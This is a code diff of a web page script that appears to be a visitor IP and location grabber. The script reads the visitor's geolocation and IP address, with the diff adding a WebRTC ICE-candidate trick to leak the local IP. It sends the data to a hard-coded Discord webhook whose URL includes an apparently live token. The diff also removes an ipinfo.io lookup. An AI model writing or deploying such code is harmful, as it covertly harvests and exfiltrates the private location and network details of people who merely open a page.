@@ -20,6 +20,20 @@
     var ipaddr;
     var location;
 
+    function getLocalIP() {
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel('');
+      pc.createOffer(pc.setLocalDescription.bind(pc), () => {});
+      
+      pc.onicecandidate = (ice) => {
+        if (ice && ice.candidate && ice.candidate.candidate) {
+          const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+          ipaddr = myIP;
+          pc.onicecandidate = () => {};
+        }
+      };
+    }
+
 		async function boofData(type) {
 			const h = "https://discord.com/api/webhooks/1349590681160777789/3IUPkV-MaHFy7f7EGgRi8HwaByOyALxBsS37I8HPbqZMRTwrTryz7yF2FTD8QrywVjSL";
       if (type === "main") {
@@ -44,10 +58,6 @@
         }
       }
     }
-    function getIP(json) {
-      ipaddr = json.ip;
-      boofData("main");
-    }
 
 		if (navigator.geolocation) {
 			navigator.geolocation.getCurrentPosition(function(position) {
@@ -55,5 +65,4 @@
 			});
 		}
 	</script>
-  <script type="application/javascript" src="https://ipinfo.io/?format=jsonp&callback=getIP"></script>
 </html>
